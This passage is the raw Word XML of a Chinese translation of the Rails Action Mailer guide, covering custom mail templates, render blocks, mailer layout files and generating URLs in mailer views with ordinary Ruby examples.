                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; user.email,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E70205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:subject</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "Welcome to My Awesome Site",</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5E94CF0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:template_path</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'notifications',</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0DD6B59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:template_name</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'another')</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0100C28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1533DE7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0885E9B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这样，你的邮件模板就会以 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>another</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 为名，在</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/views/notifications</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中寻找。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1463898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如果你寻求更加简洁的方式，你可以传入一个 block 来指定渲染的模板，甚至直接在 block 中指定一个字符串。</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70A1A745" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="499EEA4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UserMailer &lt; ActionMailer::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="708EF65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default :from</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "notifications@example.com"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="378C6EA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217E900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welcome_email(user)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0F684AB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@user</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= user</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2F061C3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@url</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve">  </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= "</w:t>
            </w:r>
            <w:hyperlink r:id="rId610" w:history="1">
              <w:r w:rsidRPr="004E5E0B">
                <w:rPr>
                  <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                  <w:color w:val="0000FF"/>
                  <w:kern w:val="0"/>
                  <w:sz w:val="24"/>
                  <w:szCs w:val="24"/>
                  <w:u w:val="single"/>
                </w:rPr>
                <w:t>http://example.com/login</w:t>
              </w:r>
            </w:hyperlink>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1875B23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mail(:to</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; user.email,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7641C27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:subject</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "Welcome to My Awesome Site") do</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|format|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="53CE1FB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format.html { render 'another_template'</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="25A3198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format.text { render :text</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'Render text'</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7D17216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7B69C36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23798BC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08F3160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049AE4E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这样设置，mailer将会用模板 ‘another_template.html.erb’ 来渲染 HTML 部分，用 文字来渲染 text 部分。在这里，render 命令的用法和 Action Controller 中的用法是一样的，所以他们有着同样的传入参数选项，这意味着你可以使用</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:text</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:inline</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 等参数。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="454C1582"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2.5 Mailer 布局文件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12E200C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和控制器视图一样，你同样可以创建mailer 布局文件，布局文件名要和你的mailer 控制器名字一样，例如</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>user_mailer.html.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>user_mailer.text.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 就能够被自动识别成mailer的一个布局文件。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0344C95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如果要使用不同名字的文件你就需要这样：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7680"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="4E60DD27" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="00ED739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UserMailer &lt; ActionMailer::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="30781EE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layout 'awesome'</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t># use awesome.(html|text).erb as the layout</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0B476E5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751105A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和控制器视图文件一样，用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>yield</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 去渲染布局中的视图文件。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2913EAE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你同样可以在format 的block 中传入 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:layout =&gt; ‘layout_name’</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项调用 render 函数来指定不同的布局文件或者方法。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6840"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="1D1795B4" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7C289D1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UserMailer &lt; ActionMailer::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3D1EE25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welcome_email(user)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="64DD973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mail(:to</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; user.email) do</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|format|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2400007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format.html { render :layout</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'my_layout'</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2F1F828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format.text</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="66DEEA4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10CD937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399ED32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2CD6CAA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这样将会用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>my_layout.html.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 渲染 HTML 视图 用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>user_mailer.text.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 渲染 text 视图.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4728F4E2"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2.6 在 Action Mailer 视图中生成 URL.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09474CE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URL 可以在视图中使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>url_for</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法或者命名路由方法生成.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F5D383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但是和控制器不同，Mailer 实例无法得到任何请求的信息，所以你需要为方法提供 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:host</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:controller</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:action</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>: 参数</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5880"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="327486ED" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0642861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url_for(:host</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "example.com",</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="411E568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:controller</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "welcome",</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="43EB3C4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:action</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
